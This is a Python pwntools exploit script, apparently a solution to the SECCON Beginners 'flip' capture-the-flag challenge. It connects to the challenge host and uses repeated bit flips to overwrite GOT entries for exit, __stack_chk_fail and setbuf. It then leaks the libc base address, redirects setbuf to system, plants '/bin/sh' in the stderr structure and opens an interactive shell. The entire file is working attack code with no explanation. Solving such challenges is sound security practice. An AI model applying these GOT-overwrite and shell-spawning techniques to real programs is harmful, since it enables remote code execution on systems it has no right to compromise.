#!/usr/bin/env python
from pwn import *

context.log_level = 'WARNING'

elf = ELF('./flip')
libc = ELF('./libc-2.27.so')

def connect():
    if len(sys.argv) == 1:
        return process('./flip')
    else:
        return remote('flip.quals.beginners.seccon.jp', 17539)

def flip(addr, first, second):
    s.sendlineafter('Input address >> ', str(addr))
    s.sendlineafter('Which bit (0 ~ 7) >> ', str(first))
    s.sendlineafter('Which bit (0 ~ 7) >> ', str(second))
    s.recvline()

def replace(addr, frm, to):
    diff = frm ^ to
    index = 0
    bit = 0
    queries = [[] for i in range(8)]
    while diff:
        if diff & 1:
            queries[index].append(bit)
        bit += 1
        if bit == 8:
            index += 1
            bit = 0
        diff >>= 1
    for i in range(8):
        if len(queries[i]) % 2 == 1:
            queries[i].append(-1)
    for i, query in enumerate(queries):
        for j in range(0, len(query), 2):
            flip(addr + i, query[j], query[j+1])

count = 0
p = log.progress('Brute forcing', level='WARNING')
while True:
    count += 1
    p.status(hex(count))

    s = connect()

    # exit.plt+6 -> _start+6
    replace(elf.got['exit'], 0x4006d6, 0x4006e6)

    # _start+6 -> _start
    replace(elf.got['exit'], 0x4006e6, 0x4006e0)

    # __stack_chk_fail.plt+6 -> main
    replace(elf.got['__stack_chk_fail'], 0x400676, 0x4007fa)

    # _start -> __stack_chk_fail.plt (main)
    replace(elf.got['exit'], 0x4006e0, 0x400670)

    # setbuf -> puts
    replace(elf.got['setbuf'], 0x884d0, 0x64e80)

    # _IO_2_1_stderr_ -> _IO_2_1_stderr_ + 8
    replace(elf.symbols['stderr'], 0x7f8b274e0680, 0x7f8b274e0688)

    # __stack_chk_fail.plt (main) -> _start
    replace(elf.got['exit'], 0x400670, 0x4006e0)

    try:
        if s.recv(4) == 'Inpu':
            s.close()
            continue
        p.success()
    except Exception:
        s.close()
        continue

    libc.address = u64(s.recv(6).ljust(8, '\0')) - 0x3ec703
    log.warning('libc base: %#x' % libc.address)

    # _start -> __stack_chk_fail.plt (main)
    replace(elf.got['exit'], 0x4006e0, 0x400670)

    # puts -> setbuf
    replace(elf.got['setbuf'], 0x64e80, 0x884d0)

    # setbuf -> system
    replace(elf.got['setbuf'], libc.symbols['setbuf'], libc.symbols['system'])

    # 0xfbad2087 -> "/bin/sh"
    replace(libc.symbols['_IO_2_1_stderr_'], 0xfbad2087, u64('/bin/sh\0'))

    # _IO_2_1_stderr_ + 8 -> _IO_2_1_stderr_
    replace(elf.symbols['stderr'], libc.symbols['_IO_2_1_stderr_'] + 8, libc.symbols['_IO_2_1_stderr_'])

    # __stack_chk_fail.plt (main) -> _start
    replace(elf.got['exit'], 0x400670, 0x4006e0)

    s.interactive()
